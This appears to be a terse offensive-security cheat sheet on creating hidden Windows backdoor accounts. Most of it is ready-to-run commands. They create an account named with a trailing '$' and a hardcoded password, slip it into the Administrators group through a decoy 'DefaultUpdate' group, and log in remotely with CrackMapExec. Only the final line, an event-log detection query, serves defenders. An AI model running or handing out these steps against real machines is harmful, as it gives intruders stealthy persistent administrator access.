## add hidden account
1. https://twitter.com/Ben0xA/status/1301550957516541952
2. https://www.trustedsec.com/events/webinar-deception-and-discovery-how-attackers-hide-backdoor-accounts-and-how-defenders-find-them/?utm_campaign=Webinar%20-%20BD%20Deception%20%26%20Discovery&utm_content=170008881&utm_medium=social&utm_source=twitter&hss_channel=tw-403811306
```
C:\WINDOWS\system32> net user $ LetMeIn123! /add /active:yes

C:\WINDOWS\system32> net user
```
Fun fact, you can add anything you want in front of the $ as its exploiting the normal "hidden folder share" method.
```
C:\WINDOWS\system32> net user test$ LetMeIn123! /add /active:yes

C:\WINDOWS\system32> net user
```


### Add to local Administrators
```
C:\WINDOWS\system32> net localgroup DefaultUpdate /add

C:\WINDOWS\system32> net localgroup DefaultUpdate $ /add

C:\WINDOWS\system32> net localgroup Administrators DefaultUpdate /add

C:\WINDOWS\system32> net localgroup Administrators
```

### user can be seen in Powershell:
```
PS C:\> get-localuser

PS C:\> wmic useraccount get name
```

## abuse hidden account from Linux:
```
# cme smb -u '$' -p 'LetMeIn123!' --local-auth 172.16.133.130
```
reference: 
1. https://github.com/byt3bl33d3r/CrackMapExec
2. https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference

## Detection: 
```
eventid:4720 and account_name="^.*\$$" (regex)
```
